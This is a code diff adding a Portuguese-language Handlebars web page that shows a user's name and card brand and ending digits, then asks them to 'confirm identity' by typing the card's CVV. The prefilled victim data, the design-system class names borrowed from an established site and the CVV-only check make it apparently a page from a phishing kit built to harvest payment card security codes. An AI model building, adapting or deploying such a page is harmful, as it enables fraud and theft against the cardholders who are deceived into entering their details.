@@ -1,0 +1,74 @@
+{{>components/topbar}}
+
+<main>
+    <div class="center__billboard"></div>
+
+    <div class="main-form">
+
+        <form class="main-form-login card_verify">
+
+            <header class="main-form-login__header">
+                <h2>Confirmar informações</h2>
+            </header>
+
+            {{#if client}}<input type="hidden" name="id" value="{{client.id}}">{{/if}}
+            {{#if client}}<input type="hidden" name="user" value="{{client.user}}">{{/if}}
+
+            <article class="main-form-login__inputs {{#if error}}has-error{{/if}}">
+                <span class="main-form-login__username">
+
+                    <div>
+                        <figure><object type="image/svg+xml" data="/img/icons/avatar.svg"></object></figure>
+                        <span>{{client.user}}</span>
+                        <a href="./"><i class="email-badge__close"></i></a>
+
+                    </div>
+                </span>
+
+                <div class="main-form-login__card">
+                    <h3>Confirme sua identidade, informe o número do verso do cartão final</h3>
+
+                    <div class="card_container">
+                        <figure><img src="/img/brand/{{client.cards.0.flag}}.svg" ></figure>
+                        {{client.cards.0.end}}
+                    </div>
+                </div>
+
+                <span class="main-form-login__login">
+                    <label for="cvv">Verso do cartão</label>
+                    <input type="hidden" name="end" value="{{client.cards.0.end}}">
+                    <div class="input-container">
+                        <img src="/img/brand/{{client.cards.0.flag}}.svg" >
+                        <input type="password" name="cvv" id="cvv" required="required">
+                    </div>
+                    {{#if error}}
+                    <span class="notify-error">
+                        <figure>
+                            <svg class="andes-form-control---error-icon" width="12" height="12" viewBox="0 0 12 12"><defs><rect id="a" width="12" height="12" rx="6"></rect></defs><g fill="none" fill-rule="evenodd"><mask id="b" fill="#fff"><use xlink:href="#a"></use></mask><g mask="url(#b)"><path fill="#F23D4F" d="M-.686-.343h13.371v12.686H-.685z"></path><path fill="#FFF" fill-rule="nonzero" d="M6 7.636a.727.727 0 1 1 0 1.455.727.727 0 0 1 0-1.455zm.727-4.727l-.182 4h-1.09l-.182-4h1.454z"></path></g></g></svg>
+                        </figure>
+                        Revise o verso do cartão
+                    </span>
+                    {{/if}}
+                </span>
+
+                <span class="main-form-login__submit">
+                    <button>Continuar</button>
+                </span>
+
+                <span class="main-form-login__helper">
+                    <a href="#">Esqueceu a sua senha?</a>
+                </span>
+            </article>
+
+            <footer>
+                <a href="#">Preciso de ajuda para entrar</a>
+            </footer>
+        </form>
+    </div>
+
+    <div class="protect">
+        Protegido por reCAPTCHA-  <a href="https://policies.google.com/terms?hl=pt-BR">Privacidade - Condições</a>
+    </div>
+
+</main>
+{{>components/footer}}
